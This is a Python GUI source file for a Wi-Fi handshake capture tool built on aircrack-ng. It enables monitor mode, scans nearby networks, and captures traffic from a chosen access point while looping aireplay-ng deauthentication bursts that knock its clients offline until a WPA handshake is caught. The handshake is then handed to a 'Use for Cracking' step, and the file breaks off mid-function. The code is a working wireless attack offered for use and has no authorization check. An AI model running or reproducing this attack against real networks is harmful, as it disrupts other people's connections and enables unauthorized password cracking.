# gui/wifi_capture_page.py
from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton,
    QTabWidget, QTextEdit, QGroupBox, QLineEdit, QFileDialog,
    QMessageBox, QProgressBar, QTextBrowser, QFrame,
    QApplication, QScrollArea, QFormLayout, QComboBox,
    QTableWidget, QTableWidgetItem, QHeaderView,
    QAbstractItemView, QRadioButton, QButtonGroup, QSpinBox
)
from PySide6.QtCore import Qt, Signal, QThread, QSize
from PySide6.QtGui import QIcon, QColor, QFont
from gui.layout_manager import layout_manager
import os, subprocess, threading, time, re, sys, shutil, csv


class MonitorModeWorker(QThread):
    progress = Signal(str)
    done = Signal(bool, str, str)
    
    def __init__(self, interface):
        super().__init__()
        self.interface = interface
    
    def run(self):
        try:
            self.progress.emit("Stopping interfering processes...")
            subprocess.run(["sudo", "airmon-ng", "check", "kill"],
                         capture_output=True, text=True, timeout=10)
            
            self.progress.emit(f"Enabling monitor mode on {self.interface}...")
            result = subprocess.run(["sudo", "airmon-ng", "start", self.interface],
                                  capture_output=True, text=True, timeout=10)
            
            monitor_iface = None
            output = result.stdout + result.stderr
            
            match = re.search(r'monitor mode enabled on (\w+)', output, re.IGNORECASE)
            if match:
                candidate = match.group(1)
                if 'phy' not in candidate:
                    monitor_iface = candidate
            
            if not monitor_iface:
                try:
                    result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
                    for line in result.stdout.split('\n'):
                        if 'Interface' in line:
                            match = re.search(r'Interface\s+(\w+)', line)
                            if match:
                                iface = match.group(1)
                                if 'mon' in iface and 'phy' not in iface:
                                    monitor_iface = iface
                                    break
                except:
                    pass
            
            if not monitor_iface:
                net_dir = '/sys/class/net'
                if os.path.exists(net_dir):
                    for iface in os.listdir(net_dir):
                        if 'mon' in iface and 'phy' not in iface:
                            try:
                                with open(f'/sys/class/net/{iface}/type', 'r') as f:
                                    iface_type = f.read().strip()
                                if iface_type == '803':
                                    monitor_iface = iface
                                    break
                            except:
                                if iface.startswith(self.interface):
                                    monitor_iface = iface
                                    break
            
            if not monitor_iface:
                result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'Mode:Monitor' in line:
                        iface = line.split()[0]
                        if 'phy' not in iface:
                            monitor_iface = iface
                            break
            
            if not monitor_iface:
                candidates = [
                    f"{self.interface}mon",
                    self.interface.replace('wlp', 'wlan') + 'mon',
                ]
                for candidate in candidates:
                    if os.path.exists(f'/sys/class/net/{candidate}'):
                        monitor_iface = candidate
                        break
            
            if not monitor_iface:
                net_dir = '/sys/class/net'
                if os.path.exists(net_dir):
                    for iface in os.listdir(net_dir):
                        if 'mon' in iface and 'phy' not in iface:
                            monitor_iface = iface
                            break
            
            if not monitor_iface:
                monitor_iface = f"{self.interface}mon"
            
            self.progress.emit(f"Monitor interface: {monitor_iface}")
            self.done.emit(True, f"Monitor mode enabled: {monitor_iface}", monitor_iface)
            
        except Exception as e:
            self.done.emit(False, str(e), "")


class RealTimeScanWorker(QThread):
    networks_found = Signal(list)
    done = Signal(bool, str)
    debug_output = Signal(str)

    def __init__(self, monitor_interface):
        super().__init__()
        self.monitor_interface = monitor_interface
        self.stop_flag = threading.Event()
        self.csv_prefix = None
        self.proc = None

    def run(self):
        try:
            if not os.path.exists(f'/sys/class/net/{self.monitor_interface}'):
                self.debug_output.emit(f"Interface {self.monitor_interface} not found!")
                net_dir = '/sys/class/net'
                if os.path.exists(net_dir):
                    for iface in os.listdir(net_dir):
                        if 'mon' in iface and 'phy' not in iface:
                            try:
                                with open(f'/sys/class/net/{iface}/type', 'r') as f:
                                    iface_type = f.read().strip()
                                if iface_type == '803':
                                    self.monitor_interface = iface
                                    self.debug_output.emit(f"Using monitor interface: {self.monitor_interface}")
                                    break
                            except:
                                if 'mon' in iface:
                                    self.monitor_interface = iface
                                    self.debug_output.emit(f"Using interface with mon: {self.monitor_interface}")
                                    break

            scan_dir = os.path.join(os.path.expanduser("~"), ".sokonalysis", "scan")
            os.makedirs(scan_dir, exist_ok=True)
            for f in os.listdir(scan_dir):
                if f.startswith("livescan"):
                    try: os.remove(os.path.join(scan_dir, f))
                    except: pass
            self.csv_prefix = os.path.join(scan_dir, "livescan")

            cmd = ["sudo", "airodump-ng", "--output-format", "csv",
                   "--write", self.csv_prefix, self.monitor_interface]

            self.debug_output.emit(f"Scanning on: {self.monitor_interface}")

            self.proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )

            csv_file = self.csv_prefix + "-01.csv"

            while not self.stop_flag.is_set():
                if self.proc.poll() is not None:
                    break

                if os.path.exists(csv_file):
                    networks = self._parse_csv(csv_file)
                    if networks:
                        self.networks_found.emit(networks)

                time.sleep(1)

            if self.proc:
                try:
                    self.proc.terminate()
                    time.sleep(1)
                    if self.proc.poll() is None:
                        self.proc.kill()
                except:
                    pass

            self.done.emit(True, "Scan stopped")

        except Exception as e:
            self.done.emit(False, str(e))

    def _parse_csv(self, csv_file):
        networks = []
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            ap_section = content.split("Station MAC")[0]
            lines = [l for l in ap_section.split('\n') if l.strip()]
            if len(lines) < 2:
                return networks

            rows = list(csv.reader(lines))
            header = [h.strip() for h in rows[0]]

            def col(row, name, default=''):
                try:
                    idx = header.index(name)
                    return row[idx].strip() if idx < len(row) else default
                except ValueError:
                    return default

            for row in rows[1:]:
                bssid = col(row, 'BSSID')
                if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                    continue
                channel = col(row, 'channel') or '?'
                privacy = col(row, 'Privacy') or 'OPN'
                essid = col(row, 'ESSID')
                if not essid:
                    essid = '<Hidden>'
                networks.append({
                    'bssid': bssid,
                    'channel': channel,
                    'encryption': privacy if privacy else 'OPN',
                    'essid': essid
                })
        except Exception as e:
            self.debug_output.emit(f"CSV parse error: {e}")
        return networks

    def stop(self):
        self.stop_flag.set()
        if self.proc:
            try:
                self.proc.terminate()
            except:
                pass


class CaptureWorker(QThread):
    progress = Signal(str)
    progress_value = Signal(int)
    capture_done = Signal(bool, str)
    handshake_file = Signal(str)
    
    def __init__(self, monitor_interface, target_bssid, target_channel, target_essid, deauth_packets=20):
        super().__init__()
        self.monitor_interface = monitor_interface
        self.target_bssid = target_bssid
        self.target_channel = target_channel
        self.target_essid = target_essid
        self.deauth_packets = deauth_packets
        self.stop_flag = threading.Event()
        self.aircrack_proc = None
    
    def run(self):
        try:
            output_dir = os.path.expanduser("~/.sokonalysis/captures")
            os.makedirs(output_dir, exist_ok=True)
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            base_name = os.path.join(output_dir, f"handshake_{timestamp}")
            
            self.progress.emit(f"Starting capture on {self.monitor_interface}...")
            self.progress.emit(f"Target: {self.target_essid} ({self.target_bssid})")
            self.progress.emit(f"Channel: {self.target_channel}")
            self.progress_value.emit(10)
            
            cmd = ["sudo", "airodump-ng", 
                   "--bssid", self.target_bssid,
                   "--channel", str(self.target_channel),
                   "--write", base_name,
                   "--output-format", "cap",
                   self.monitor_interface]
            
            self.progress.emit("Starting packet capture...")
            self.progress_value.emit(20)
            
            self.aircrack_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            time.sleep(3)
            
            self.progress_value.emit(40)
            self.progress.emit(f"Sending {self.deauth_packets} deauthentication packets...")
            
            handshake_captured = False
            start_time = time.time()
            timeout = 90
            
            def monitor_airodump():
                nonlocal handshake_captured
                while not self.stop_flag.is_set() and not handshake_captured:
                    if self.aircrack_proc.poll() is not None:
                        break
                    line = self.aircrack_proc.stdout.readline()
                    if line:
                        line = line.strip()
                        if 'WPA handshake' in line:
                            handshake_captured = True
                            self.progress.emit("Handshake detected!")
                            self.progress_value.emit(80)
                            break
                    time.sleep(0.5)
            
            monitor_thread = threading.Thread(target=monitor_airodump, daemon=True)
            monitor_thread.start()
            
            deauth_rounds = 0
            while not self.stop_flag.is_set() and not handshake_captured and (time.time() - start_time) < timeout:
                try:
                    deauth_cmd = ["sudo", "aireplay-ng", "--deauth", str(self.deauth_packets), "-a", self.target_bssid, self.monitor_interface]
                    deauth_result = subprocess.run(
                        deauth_cmd,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    
                    deauth_rounds += 1
                    if deauth_result.stdout and 'Sending' in deauth_result.stdout:
                        self.progress.emit(f"Deauth round {deauth_rounds}: Sent {self.deauth_packets} packets")
                    
                except subprocess.TimeoutExpired:
                    self.progress.emit("Deauth timeout, retrying...")
                except Exception as e:
                    self.progress.emit(f"Deauth error: {str(e)}")
                
                if not handshake_captured:
                    self.progress.emit("Waiting for client to reconnect...")
                    time.sleep(10)
            
            # Wait for complete 4-way handshake
            if handshake_captured:
                self.progress.emit("Handshake detected! Waiting for complete capture...")
                time.sleep(5)
            
            self.progress.emit("Stopping capture...")
            self.progress_value.emit(90)
            
            time.sleep(3)
            
            if self.aircrack_proc.poll() is None:
                self.aircrack_proc.terminate()
                time.sleep(2)
                if self.aircrack_proc.poll() is None:
                    self.aircrack_proc.kill()
            
            monitor_thread.join(timeout=3)
            
            self.progress_value.emit(100)
            
            cap_file = None
            possible_names = [f"{base_name}-01.cap", f"{base_name}.cap"]
            
            for name in possible_names:
                if os.path.exists(name) and os.path.getsize(name) > 1000:
                    cap_file = name
                    break
            
            if not cap_file:
                for f in os.listdir(output_dir):
                    if f.startswith(f"handshake_{timestamp}") and f.endswith('.cap'):
                        file_path = os.path.join(output_dir, f)
                        if os.path.getsize(file_path) > 1000:
                            cap_file = file_path
                            break
            
            if cap_file and os.path.exists(cap_file):
                file_size = os.path.getsize(cap_file)
                self.progress.emit(f"Capture file size: {file_size} bytes")
                
                # Verify handshake using multiple methods
                handshake_found = False
                
                # Method 1: aircrack-ng
                verify_cmd = ["aircrack-ng", cap_file]
                verify_result = subprocess.run(verify_cmd, capture_output=True, text=True, timeout=10)
                output = verify_result.stdout + verify_result.stderr
                
                if '1 handshake' in output or 'handshake' in output.lower():
                    handshake_found = True
                    self.progress.emit("Handshake verified by aircrack-ng!")
                
                # Method 2: Check for EAPOL in file content
                if not handshake_found:
                    try:
                        with open(cap_file, 'rb') as f:
                            content = f.read(50000)
                        if b'\x88\x8e' in content:
                            handshake_found = True
                            self.progress.emit("EAPOL data found in capture file!")
                    except:
                        pass
                
                # Method 3: tshark if available
                if not handshake_found:
                    try:
                        tshark_cmd = ["tshark", "-r", cap_file, "-Y", "eapol", "-c", "1"]
                        tshark_result = subprocess.run(tshark_cmd, capture_output=True, text=True, timeout=10)
                        if tshark_result.returncode == 0 and tshark_result.stdout.strip():
                            handshake_found = True
                            self.progress.emit("EAPOL packets found by tshark!")
                    except:
                        pass
                
                if handshake_found:
                    self.handshake_file.emit(cap_file)
                    self.capture_done.emit(True, "Handshake captured successfully")
                else:
                    self.progress.emit("No handshake found in capture file")
                    self.capture_done.emit(False, "No handshake captured")
            else:
                self.capture_done.emit(False, "No capture file found")
                
        except Exception as e:
            self.progress.emit(f"Error: {str(e)}")
            self.capture_done.emit(False, str(e))
        finally:
            if self.aircrack_proc:
                try:
                    if self.aircrack_proc.poll() is None:
                        self.aircrack_proc.terminate()
                except:
                    pass
    
    def stop(self):
        self.stop_flag.set()
        if self.aircrack_proc:
            try:
                if self.aircrack_proc.poll() is None:
                    self.aircrack_proc.terminate()
            except:
                pass


class WiFiCapturePage(QWidget):
    def __init__(self, theme_manager, back_callback, handshake_file_callback=None):
        super().__init__()
        self.theme = theme_manager
        self.back_callback = back_callback
        self.handshake_file_callback = handshake_file_callback
        self.worker = None
        self.scan_worker = None
        self.interfaces = []
        self.monitor_interface = None
        self.networks = []
        self.captured_file = None
        self.selected_interface = None
        self.selected_network = None
        self.radio_group = None
        self.air_ok = self._chk("aircrack-ng")
        self._init_ui()
        self._load_interfaces()
    
    def __del__(self):
        self._cleanup_workers()
    
    def _cleanup_workers(self):
        try:
            if self.scan_worker and self.scan_worker.isRunning():
                self.scan_worker.stop()
                self.scan_worker.wait(3000)
                if self.scan_worker.isRunning():
                    self.scan_worker.terminate()
                    self.scan_worker.wait(1000)
        except:
            pass
        
        try:
            if self.worker and self.worker.isRunning():
                self.worker.stop()
                self.worker.wait(3000)
                if self.worker.isRunning():
                    self.worker.terminate()
                    self.worker.wait(1000)
        except:
            pass
    
    def _chk(self, cmd):
        try:
            return subprocess.run([cmd], capture_output=True, timeout=3).returncode in [0, 1]
        except:
            return False
    
    def _go_back(self):
        self._cleanup_workers()
        if self.back_callback:
            self.back_callback()
    
    def _init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(40, 24, 40, 24)
        layout.setSpacing(12)
        
        header = QHBoxLayout()
        back_btn = QPushButton("  Back")
        icons_dir = os.path.join(sys._MEIPASS if hasattr(sys, '_MEIPASS') else os.path.join(os.path.dirname(__file__), '..'), 'assets', 'icons')
        back_icon_path = os.path.join(icons_dir, "back.png")
        if os.path.exists(back_icon_path):
            back_btn.setIcon(QIcon(back_icon_path))
            back_btn.setIconSize(QSize(16, 16))
        back_btn.setObjectName("backButton")
        back_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        back_btn.clicked.connect(self._go_back)
        back_btn.setMaximumWidth(100)
        
        title = QLabel("Wi-Fi Handshake Capture")
        title.setObjectName("pageTitle")
        
        header.addWidget(back_btn)
        header.addWidget(title)
        header.addStretch()
        
        tools_container = QHBoxLayout()
        tools_container.setSpacing(4)
        self.tools_icon = QLabel()
        self.tools_icon.setFixedSize(32, 32)
        self.tools_icon.setStyleSheet("background:transparent;")
        self.tb = QLabel()
        self._ut()
        tools_container.addWidget(self.tools_icon)
        tools_container.addWidget(self.tb)
        header.addLayout(tools_container)
        
        self.tabs = QTabWidget()
        self.tabs.addTab(self._create_interface_tab(), "Interface")
        self.tabs.addTab(self._create_networks_tab(), "Networks")
        self.tabs.addTab(self._create_status_tab(), "Status")
        self.tabs.addTab(self._create_results_tab(), "Results")
        self.tabs.addTab(self._create_requirements_tab(), "Requirements")
        
        self.tabs.setTabEnabled(1, False)
        self.tabs.setTabEnabled(2, False)
        self.tabs.setTabEnabled(3, False)
        
        layout.addLayout(header)
        layout.addWidget(self.tabs, 1)
        
        self._apply_theme()
    
    def _ut(self):
        t = self.theme.current
        icons_dir = os.path.join(sys._MEIPASS if hasattr(sys, '_MEIPASS') else os.path.join(os.path.dirname(__file__), '..'), 'assets', 'icons')
        ok = self.air_ok
        self.tb.setText("Aircrack-ng Ready" if ok else "Aircrack-ng Missing")
        c = t['success'] if ok else t['error']
        icon_path = os.path.join(icons_dir, "aircrack-ng.png") if ok else os.path.join(icons_dir, "no.png")
        self.tb.setStyleSheet(f"padding:4px 12px;border-radius:12px;font-size:12px;font-weight:600;background:{c}22;color:{c};")
        if os.path.exists(icon_path) and hasattr(self, 'tools_icon'):
            self.tools_icon.setPixmap(QIcon(icon_path).pixmap(32, 32))
    
    def _create_interface_tab(self):
        widget = QWidget()
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("border: none; background: transparent;")
        content = QWidget()
        layout = QVBoxLayout(content)
        layout.setContentsMargins(20, 16, 20, 16)
        layout.setSpacing(14)
        
        interface_group = QGroupBox("Available Interfaces")
        interface_layout = QVBoxLayout()
        
        self.interface_table = QTableWidget()
        self.interface_table.setColumnCount(4)
        self.interface_table.setHorizontalHeaderLabels(["", "Interface", "Type", "Chipset"])
        self.interface_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Fixed)
        self.interface_table.setColumnWidth(0, 40)
        self.interface_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        self.interface_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        self.interface_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        self.interface_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.interface_table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.interface_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.interface_table.setAlternatingRowColors(True)
        self.interface_table.verticalHeader().setVisible(False)
        self.interface_table.setShowGrid(True)
        self.interface_table.setMinimumHeight(200)
        
        interface_layout.addWidget(self.interface_table)
        
        refresh_btn = QPushButton("Refresh Interfaces")
        refresh_btn.setObjectName("actionButton")
        refresh_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        refresh_btn.clicked.connect(self._load_interfaces)
        interface_layout.addWidget(refresh_btn)
        
        interface_group.setLayout(interface_layout)
        layout.addWidget(interface_group)
        
        mode_group = QGroupBox("Operation Mode")
        mode_layout = QVBoxLayout()
        
        self.mode_status = QLabel("Select an interface to continue:")
        self.mode_status.setWordWrap(True)
        self.mode_status.setMinimumHeight(40)
        
        mode_buttons_layout = QHBoxLayout()
        
        self.managed_btn = QPushButton("Managed Mode")
        self.managed_btn.setObjectName("actionButton")
        self.managed_btn.setMinimumHeight(42)
        self.managed_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.managed_btn.clicked.connect(self._enable_managed_mode)
        self.managed_btn.setEnabled(False)
        
        self.monitor_btn = QPushButton("Monitor Mode")
        self.monitor_btn.setObjectName("actionButton")
        self.monitor_btn.setMinimumHeight(42)
        self.monitor_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.monitor_btn.clicked.connect(self._enable_monitor_mode)
        self.monitor_btn.setEnabled(False)
        
        mode_buttons_layout.addWidget(self.managed_btn)
        mode_buttons_layout.addWidget(self.monitor_btn)
        
        mode_layout.addWidget(self.mode_status)
        mode_layout.addLayout(mode_buttons_layout)
        mode_group.setLayout(mode_layout)
        layout.addWidget(mode_group)
        
        layout.addStretch()
        
        scroll.setWidget(content)
        outer_layout = QVBoxLayout(widget)
        outer_layout.setContentsMargins(0, 0, 0, 0)
        outer_layout.addWidget(scroll)
        
        return widget
    
    def _create_networks_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 16, 20, 16)
        layout.setSpacing(14)
        
        self.network_count_label = QLabel("Waiting for scan...")
        self.network_count_label.setStyleSheet(f"color: {self.theme.current['text_secondary']}; font-size: 12px;")
        
        self.networks_table = QTableWidget()
        self.networks_table.setColumnCount(5)
        self.networks_table.setHorizontalHeaderLabels(["", "ESSID", "BSSID", "Channel", "Encryption"])
        self.networks_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Fixed)
        self.networks_table.setColumnWidth(0, 40)
        self.networks_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self.networks_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        self.networks_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        self.networks_table.horizontalHeader().setSectionResizeMode(4, QHeaderView.ResizeMode.ResizeToContents)
        self.networks_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.networks_table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.networks_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.networks_table.setAlternatingRowColors(True)
        self.networks_table.setMinimumHeight(200)
        self.networks_table.verticalHeader().setVisible(False)
        self.networks_table.setShowGrid(True)
        
        deauth_group = QGroupBox("Deauthentication Packets")
        deauth_layout = QHBoxLayout()
        
        deauth_layout.addWidget(QLabel("Packets:"))
        
        self.deauth_spin = QSpinBox()
        self.deauth_spin.setRange(1, 100)
        self.deauth_spin.setValue(20)
        self.deauth_spin.setMaximumWidth(100)
        self.deauth_spin.setMinimumHeight(35)
        deauth_layout.addWidget(self.deauth_spin)
        
        paste_btn = QPushButton("Paste")
        paste_btn.setObjectName("actionButton")
        paste_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        paste_btn.clicked.connect(self._paste_packets)
        deauth_layout.addWidget(paste_btn)
        
        clear_btn = QPushButton("Clear")
        clear_btn.setObjectName("dangerButton")
        clear_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        clear_btn.clicked.connect(self._clear_packets)
        deauth_layout.addWidget(clear_btn)
        
        deauth_layout.addStretch()
        deauth_group.setLayout(deauth_layout)
        
        self.capture_btn = QPushButton("Capture Handshake")
        self.capture_btn.setObjectName("actionButton")
        self.capture_btn.setMinimumHeight(42)
        self.capture_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.capture_btn.clicked.connect(self._start_capture)
        self.capture_btn.setEnabled(False)
        
        layout.addWidget(self.network_count_label)
        layout.addWidget(self.networks_table)
        layout.addWidget(deauth_group)
        layout.addWidget(self.capture_btn)
        layout.addStretch()
        
        return widget
    
    def _paste_packets(self):
        clipboard = QApplication.clipboard().text()
        if clipboard:
            try:
                value = int(clipboard.strip())
                if 1 <= value <= 100:
                    self.deauth_spin.setValue(value)
            except ValueError:
                pass
    
    def _clear_packets(self):
        self.deauth_spin.setValue(20)
    
    def _create_status_tab(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(20, 16, 20, 16)
        l.setSpacing(12)
        
        self.pb = QProgressBar()
        self.pb.setRange(0, 100)
        self.pb.setValue(0)
        self.pb.setTextVisible(True)
        self.pb.setFormat("%p%")
        self.pb.setMinimumHeight(28)
        
        self.so = QTextEdit()
        self.so.setReadOnly(True)
        self.so.setPlaceholderText("Capture log...")
        
        l.addWidget(self.pb)
        l.addWidget(self.so)
        
        return w
    
    def _create_results_tab(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(20, 16, 20, 16)
        l.setSpacing(12)
        
        self.res_grp = QGroupBox("Result")
        rl = QVBoxLayout()
        
        self.handshake_preview = QLabel("No handshake captured yet")
        self.handshake_preview.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.handshake_preview.setMinimumHeight(100)
        self.handshake_preview.setWordWrap(True)
        
        rh = QHBoxLayout()
        rh.addStretch()
        
        self.export_btn = QPushButton("Export Handshake")
        self.export_btn.setObjectName("actionButton")
        self.export_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.export_btn.clicked.connect(self._export_handshake)
        self.export_btn.setEnabled(False)
        
        self.use_file_btn = QPushButton("Use for Cracking")
        self.use_file_btn.setObjectName("actionButton")
        self.use_file_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.use_file_btn.clicked.connect(self._use_for_cracking)
        self.use_file_btn.setEnabled(False)
        
        rh.addWidget(self.export_btn)
        rh.addWidget(self.use_file_btn)
        
        rl.addWidget(self.handshake_preview)
        rl.addLayout(rh)
        rl.addStretch()
        self.res_grp.setLayout(rl)
        l.addWidget(self.res_grp, 1)
        
        return w
    
    def _create_requirements_tab(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(30, 24, 30, 24)
        l.setSpacing(14)
        
        self.req_group = QGroupBox("Required Tools")
        rl = QVBoxLayout()
        rl.setSpacing(10)
        
        self.rq = QTextBrowser()
        self.rq.setOpenExternalLinks(False)
        rl.addWidget(self.rq)
        
        self.ib = QPushButton("Install Requirements")
        self.ib.setObjectName("actionButton")
        self.ib.setMinimumHeight(40)
        self.ib.setCursor(Qt.CursorShape.PointingHandCursor)
        self.ib.clicked.connect(self._install_requirements)
        
        self.rs = QLabel("")
        rl.addWidget(self.ib)
        rl.addWidget(self.rs)
        self.req_group.setLayout(rl)
        l.addWidget(self.req_group)
        l.addStretch()
        
        self._update_requirements()
        return w
    
    def _load_interfaces(self):
        self.interfaces = []
        self.interface_table.setRowCount(0)
        self.radio_group = QButtonGroup(self)
        
        try:
            net_dir = '/sys/class/net'
            if os.path.exists(net_dir):
                for iface in sorted(os.listdir(net_dir)):
                    if iface != 'lo' and iface not in self.interfaces:
                        if 'phy' in iface:
                            continue
                        if not any(skip in iface for skip in ['docker', 'veth', 'br-', 'virbr', 'vnet']):
                            self.interfaces.append(iface)
            
            interface_info = {}
            for iface in self.interfaces:
                info = {'type': 'Unknown', 'chipset': 'Unknown', 'freq': 'Unknown'}
                
                is_wireless = False
                try:
                    result = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=5)
                    output = result.stdout + result.stderr
                    if 'IEEE 802.11' in output or 'ESSID' in output:
                        is_wireless = True
                        info['type'] = "Wireless"
                        
                        if 'Mode:Monitor' in output:
                            info['type'] = "Monitor Mode"
                        
                        try:
                            result_freq = subprocess.run(["iw", "list"], capture_output=True, text=True, timeout=5)
                            if '5180 MHz' in result_freq.stdout:
                                info['freq'] = "2.4Ghz, 5Ghz (WiFi5)"
                            else:
                                info['freq'] = "2.4Ghz"
                        except:
                            info['freq'] = "2.4Ghz"
                except:
                    pass
                
                if not is_wireless:
                    try:
                        with open(f'/sys/class/net/{iface}/type', 'r') as f:
                            iface_type = f.read().strip()
                        if iface_type == '1':
                            info['type'] = "Ethernet"
                            info['freq'] = "Ethernet"
                        elif iface_type == '803':
                            info['type'] = "Monitor Mode"
                            info['freq'] = "Wireless"
                            is_wireless = True
                    except:
                        pass
                
                try:
                    result = subprocess.run(["lshw", "-class", "network", "-short"], 
                                          capture_output=True, text=True, timeout=10)
                    for line in result.stdout.split('\n'):
                        if iface in line:
                            parts = line.strip().split()
                            if len(parts) > 2:
                                info['chipset'] = ' '.join(parts[2:])
                            break
                except:
                    pass
                
                if info['chipset'] == 'Unknown':
                    try:
                        result = subprocess.run(["lspci"], capture_output=True, text=True, timeout=5)
                        for line in result.stdout.split('\n'):
                            if 'Network controller' in line or 'Ethernet controller' in line:
                                if ':' in line:
                                    chipset = line.split(':', 2)[-1].strip()
                                    if is_wireless and ('Wireless' in line or 'WiFi' in line or '802.11' in line or 'Network controller' in line):
                                        info['chipset'] = chipset
                                        break
                                    elif not is_wireless and 'Ethernet' in line:
                                        info['chipset'] = chipset
                                        break
                    except:
                        pass
                
                interface_info[iface] = info
            
            self.interface_table.setRowCount(len(self.interfaces))
            
            for row, iface in enumerate(self.interfaces):
                info = interface_info.get(iface, {'type': 'Unknown', 'chipset': 'Unknown', 'freq': 'Unknown'})
                
                radio = QRadioButton()
                radio.setCursor(Qt.CursorShape.PointingHandCursor)
                radio.clicked.connect(lambda checked, i=iface: self._on_interface_selected(i))
                self.radio_group.addButton(radio)
                
                radio_container = QWidget()
                radio_layout = QHBoxLayout(radio_container)
                radio_layout.addWidget(radio)
                radio_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
                radio_layout.setContentsMargins(0, 0, 0, 0)
                self.interface_table.setCellWidget(row, 0, radio_container)
                
                iface_item = QTableWidgetItem(iface)
                iface_item.setFont(QFont("JetBrains Mono", 11, QFont.Weight.Bold))
                self.interface_table.setItem(row, 1, iface_item)
                
                display_text = info.get('freq', info.get('type', 'Unknown'))
                type_item = QTableWidgetItem(display_text)
                type_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                if 'Monitor' in info.get('type', ''):
                    type_item.setForeground(QColor(self.theme.current['success']))
                elif 'Wireless' in info.get('type', ''):
                    type_item.setForeground(QColor(self.theme.current['accent']))
                self.interface_table.setItem(row, 2, type_item)
                
                chipset_item = QTableWidgetItem(info.get('chipset', 'Unknown'))
                self.interface_table.setItem(row, 3, chipset_item)
            
            self.interface_table.cellClicked.connect(self._on_interface_row_clicked)
            
            if not self.interfaces:
                self.interface_table.setRowCount(1)
                no_iface_item = QTableWidgetItem("No network interfaces found")
                no_iface_item.setFont(QFont("JetBrains Mono", 11))
                self.interface_table.setItem(0, 1, no_iface_item)
                self.interface_table.setSpan(0, 1, 1, 3)
            
        except Exception as e:
            self.interface_table.setRowCount(1)
            error_item = QTableWidgetItem(f"Error: {str(e)}")
            error_item.setFont(QFont("JetBrains Mono", 11))
            self.interface_table.setItem(0, 1, error_item)
            self.interface_table.setSpan(0, 1, 1, 3)
    
    def _on_interface_selected(self, interface):
        if interface:
            self.selected_interface = interface
            
            try:
                with open(f'/sys/class/net/{interface}/type', 'r') as f:
                    iface_type = f.read().strip()
                
                if iface_type == '803':
                    if 'phy' not in interface:
                        self.monitor_interface = interface
                        self.mode_status.setText(f"Interface in monitor mode: {interface}")
                        self.monitor_btn.setText("Already in Monitor Mode")
                        self.monitor_btn.setEnabled(False)
                        self.managed_btn.setEnabled(True)
                        self.tabs.setTabEnabled(1, True)
                        self._start_real_time_scan()
                else:
                    self.mode_status.setText(f"Selected interface: {interface}")
                    self.monitor_btn.setText("Monitor Mode")
                    self.monitor_btn.setEnabled(True)
                    self.managed_btn.setEnabled(False)
                    
            except:
                self.mode_status.setText(f"Selected interface: {interface}")
                self.monitor_btn.setEnabled(True)
                self.managed_btn.setEnabled(False)
    
    def _on_interface_row_clicked(self, row, col):
        if self.interfaces and 0 <= row < len(self.interfaces):
            if self.radio_group and row < len(self.radio_group.buttons()):
                self.radio_group.buttons()[row].setChecked(True)
                self.selected_interface = self.interfaces[row]
                self._on_interface_selected(self.selected_interface)
            self.interface_table.selectRow(row)
    
    def _enable_managed_mode(self):
        if not self.monitor_interface:
            self.mode_status.setText("No monitor interface to disable")
            return
        
        self.mode_status.setText(f"Switching {self.monitor_interface} to managed mode...")
        self.managed_btn.setEnabled(False)
        self.monitor_btn.setEnabled(False)
        
        def switch_to_managed():
            try:
                subprocess.run(["sudo", "airmon-ng", "stop", self.monitor_interface],
                             capture_output=True, text=True, timeout=15)
                
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"],
                             capture_output=True, text=True, timeout=15)
                
                self.mode_status.setText(f"Interface switched to managed mode")
